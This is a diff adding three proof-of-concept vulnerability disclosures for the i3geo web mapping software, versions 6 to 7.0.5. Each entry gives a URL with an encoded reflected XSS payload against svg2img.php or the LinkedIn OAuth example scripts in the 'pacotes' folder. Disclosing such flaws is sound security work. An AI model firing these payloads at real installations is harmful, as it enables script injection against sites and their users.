@@ -14,3 +14,69 @@ You can download it from the link below:
 - https://softwarepublico.gov.br/social/i3geo
 - https://github.com/edmarmoretti/i3geo
 - https://github.com/saladesituacao/i3geo
+
+References:
+- https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion
+
+
+
+####################################
+#      XSS or HTML Injection       #
+####################################
+
+i3geo - Proof of Concept - Version 6 <= 7.0.5
+
+The vulnerability is a XSS (Cross Site Scripting) or HTML Injection in svg2img.php file. The file is located in the "pacotes" folder (/i3geo/pacotes/).
+
+To exploit the vulnerability:
+- http://.../i3geo/pacotes/svg2img.php?w=%3C/script%3E%3Cscript%3Ealert(%22HACKED%22)%3C/script%3E%3C!--
+
+You can download it from the link below:
+- https://softwarepublico.gov.br/social/i3geo
+- https://github.com/edmarmoretti/i3geo
+- https://github.com/saladesituacao/i3geo
+
+References:
+- https://owasp.org/www-community/attacks/xss/
+
+
+
+####################################
+#      XSS or HTML Injection       #
+####################################
+
+i3geo - Proof of Concept - Version 6 <= 7.0.5
+
+The vulnerability is a XSS (Cross Site Scripting) or HTML Injection in access_token.php file. The file is located in the "pacotes" folder (/i3geo/pacotes/).
+
+To exploit the vulnerability:
+- http://.../i3geo/pacotes/linkedinoauth/example/access_token.php?=%22%3E%3Cscript%3Ealert(%22HACKED%22)%3C/script%3E%3C!--
+
+You can download it from the link below:
+- https://softwarepublico.gov.br/social/i3geo
+- https://github.com/edmarmoretti/i3geo
+- https://github.com/saladesituacao/i3geo
+
+References:
+- https://owasp.org/www-community/attacks/xss/
+
+
+
+####################################
+#      XSS or HTML Injection       #
+####################################
+
+i3geo - Proof of Concept - Version 6 <= 7.0.5
+
+The vulnerability is a XSS (Cross Site Scripting) or HTML Injection in request_token.php file. The file is located in the "pacotes" folder (/i3geo/pacotes/).
+
+To exploit the vulnerability:
+- http://.../i3geo/pacotes/linkedinoauth/example/request_token.php?=%22%3E%3Cscript%3Ealert(%22HACKED%22)%3C/script%3E%3C!--
+
+You can download it from the link below:
+- https://softwarepublico.gov.br/social/i3geo
+- https://github.com/edmarmoretti/i3geo
+- https://github.com/saladesituacao/i3geo
+
+References:
+- https://owasp.org/www-community/attacks/xss/
